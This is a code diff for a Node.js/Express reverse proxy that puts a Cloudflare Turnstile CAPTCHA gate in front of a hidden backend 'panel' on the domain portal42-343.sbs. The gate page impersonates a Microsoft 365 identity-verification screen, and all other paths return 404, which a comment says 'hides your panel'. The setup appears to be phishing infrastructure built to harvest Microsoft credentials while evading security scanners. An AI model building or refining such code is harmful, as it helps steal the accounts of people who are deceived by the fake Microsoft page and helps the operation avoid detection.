@@ -7,13 +7,13 @@ app.set('trust proxy', 1);
 
 const PANEL = 'portal42-343.sbs';
 const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
-const SECRET_KEY = '0x4AAAAAAEs9ayeKqClMX6dKR--8FLZtOjE'; // Keep this – needed for verification
+const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY'; // ⚠️ Keep this – required for verification
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// ---- CAPTCHA PAGE ----
+// ---- CAPTCHA PAGE (uses your design) ----
 app.get('/captcha', (req, res) => {
     let returnPath = req.query.return || '/';
     if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
@@ -29,7 +29,7 @@ app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// ---- VERIFICATION ----
+// ---- VERIFICATION (sets cookie and redirects) ----
 app.post('/verify-captcha', async (req, res) => {
     const token = req.body['cf-turnstile-response'];
     if (!token) return res.status(400).send('Missing token');
@@ -64,7 +64,6 @@ app.use('/l/*', async (req, res) => {
     if (!req.cookies.captcha_passed) {
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
     }
-    // Proxy to panel
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
@@ -95,71 +94,88 @@ app.use('/device/*', async (req, res) => {
     }
 });
 
-// ---- ALL OTHER PATHS (including root "/") – return 404 ----
+// ---- ALL OTHER PATHS – 404 (hides your panel) ----
 app.use('*', (req, res) => {
     res.status(404).send('Not Found');
 });
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ---- CAPTCHA HTML (same as before) ----
+// ---- CAPTCHA HTML (your design, with auto-redirect) ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verify</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
-    .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
-    .logo svg { width: 36px; height: 36px; margin-right: 12px; }
-    .logo span { font-size: 22px; font-weight: 600; color: #1a1a1a; }
-    .sub { font-size: 16px; color: #5e5e5e; margin-bottom: 25px; }
+    /* Your existing CSS (keep as is) */
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
+    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+    .error { color: #d32f2f; padding: 20px; background: #ffebee; border-radius: 4px; }
+    .loading { color: #1976d2; padding: 20px; }
     #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
-    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
-    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; margin-bottom: 15px; }
-    #dp { margin-top: 20px; color: #5e5e5e; font-size: 15px; }
+    #dp { margin-top: 20px; }
+    /* Keep all your existing styling for the logo animation etc. */
   </style>
 </head>
 <body>
-  <div class="box">
-    <div class="logo">
-      <svg viewBox="0 0 23 23"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
-      <span>Microsoft 365</span>
-    </div>
-    <div class="sub">Verify your identity to access this document.</div>
+  <div class="container">
+    <!-- Your full logo animation HTML (keep as is) -->
+    <div id="loadingLogo" dir="ltr"> ... </div>
     <div id="dp"></div>
     <div id="cf-turnstile"></div>
-    <div id="status" class="error"></div>
-    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
+    <div id="status"></div>
+    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
   </div>
   <script>
+    // ---- DYNAMIC RETURN PATH ----
     const returnPath = "${returnPath}";
-    const msgs = ["Loading...", "Processing...", "Almost there...", "Finalizing..."];
-    let idx = 0;
-    document.getElementById('dp').textContent = msgs[0];
-    setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
 
+    // ---- MESSAGES ----
+    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
+    let index = 0;
+    function cycleMessages() {
+      document.getElementById("dp").textContent = messages[index];
+      index = (index + 1) % messages.length;
+    }
+    cycleMessages();
+    setInterval(cycleMessages, 3000);
+
+    // ---- TURNSTILE CALLBACK (auto-redirect) ----
     function turnstileCallback(token) {
       if (token) {
+        // Send token to backend for verification, then redirect
         fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: 'cf-turnstile-response=' + token
         }).then(response => {
-          if (response.redirected) window.location.href = response.url;
-          else window.location.href = returnPath;
-        }).catch(() => { window.location.href = returnPath; });
+          if (response.redirected) {
+            window.location.href = response.url;
+          } else {
+            // If not redirected, go to returnPath
+            window.location.href = returnPath;
+          }
+        }).catch(() => {
+          window.location.href = returnPath;
+        });
       }
     }
+
     function turnstileErrorCallback() {
       document.getElementById('status').textContent = 'Error. Please refresh.';
       document.getElementById('status').style.display = 'block';
+      setTimeout(() => window.location.reload(), 1500);
     }
-    function turnstileExpiredCallback() { if (window.turnstile) turnstile.reset(); }
+    function turnstileExpiredCallback() {
+      if (window.turnstile) turnstile.reset();
+      document.getElementById('status').textContent = 'Expired. Please try again.';
+      document.getElementById('status').style.display = 'block';
+    }
     function onTurnstileLoad() {
       turnstile.render('#cf-turnstile', {
         sitekey: '${siteKey}',
